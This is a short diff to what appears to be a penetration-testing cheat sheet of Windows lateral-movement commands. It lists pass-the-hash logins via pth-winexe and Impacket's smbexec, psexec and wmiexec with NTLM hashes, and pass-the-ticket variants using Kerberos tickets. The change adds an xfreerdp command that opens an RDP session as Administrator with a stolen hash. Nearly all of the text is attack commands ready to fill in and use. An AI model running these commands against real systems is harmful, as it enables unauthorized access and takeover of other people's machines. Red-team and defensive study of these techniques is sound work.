@@ -25,6 +25,9 @@ pth-winexe -U <domain>/<user>%<NTLM> //<target ip> cmd
 smbexec.py <user>@<ip> -hashes <NTLM or :NT>
 psexec.py <user>@<ip> -hashes <NTLM or :NT>
 wmiexec.py <user>@<ip> -hashes <NTLM or :NT>
+
+#rdp
+xfreerdp /u:Administrator /pth:<ntlm> /d:<domain> /v:<target>
 ```
 
 ## Pass the Ticket
@@ -84,4 +87,3 @@ python psexec.py <domain>/<user>@<host> -k -no-pass
 python smbexec.py <domain>/<user>@<host> -k -no-pass
 python wmiexec.py <domain>/<user>@<host> -k -no-pass
 ```
-
